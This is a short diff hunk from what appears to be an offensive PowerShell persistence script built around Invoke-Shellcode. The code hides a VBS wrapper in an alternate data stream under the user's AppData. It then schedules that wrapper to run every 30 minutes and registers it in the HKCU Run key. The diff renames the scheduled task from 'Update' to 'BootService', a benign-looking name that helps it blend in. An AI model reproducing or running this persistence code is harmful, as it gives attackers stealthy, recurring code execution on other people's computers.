@@ -87,7 +87,7 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
     Invoke-Command -ScriptBlock $CreateWrapperADS
     "Wrapper stored in $env:USERPROFILE\AppData:$vbsFile"
     if (!(Test-IsAdmin)){
-       $CreateScheduleADS = {cmd /c "SCHTASKS /Create /SC MINUTE /MO 30 /TN Update /TR $env:USERPROFILE\AppData:$vbsFile /F"}
+       $CreateScheduleADS = {cmd /c "SCHTASKS /Create /SC MINUTE /MO 30 /TN BootService /TR $env:USERPROFILE\AppData:$vbsFile /F"}
        Invoke-Command -ScriptBlock $CreateScheduleADS
        "Schedule payload is triggered on every 30 minutes"
        new-itemproperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name BootService -PropertyType String -Value "wscript.exe $env:USERPROFILE\AppData:$vbsFile" -Force
